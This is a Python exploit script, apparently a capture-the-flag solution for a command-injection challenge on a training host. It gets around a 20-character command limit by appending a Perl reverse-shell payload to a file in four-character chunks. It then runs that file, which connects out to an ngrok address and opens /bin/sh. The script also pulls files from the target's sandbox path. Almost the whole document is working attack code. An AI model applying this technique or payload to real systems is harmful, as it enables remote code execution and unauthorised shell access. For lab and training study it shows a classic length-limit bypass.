import requests
import threading
import hashlib

url = 'https://473831530.trains.virzz.com'


def reset():
    requests.get(url + '/?reset')


def exec_command(cmd: str):
    if len(cmd) > 20:
        print('Length limit exceeded')
    else:
        print('[+] Executing ' + cmd)
        requests.get(url, params={'cmd': cmd})


def write_file(content: str, file: str):
    split_content = [content[i: i + 4] for i in range(0, len(content), 4)]
    for s in split_content:
        exec_command(f"echo -n '{s}' >> {file}")


def write_shell():
    print('[+] Writing perl script')
    payload = 'use Socket;$i="0.tcp.ngrok.io";$p=15233;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    write_file(payload, 'p')


def reverse_shell():
    threading.Thread(None, lambda: exec_command('perl p')).start()


def request_file(file: str):
    md5 = 'a98a3a797869bc77ec48accf3774ca3d'
    print(requests.get(f'https://473831530.trains.virzz.com/sandbox/{md5}/' + file).text)
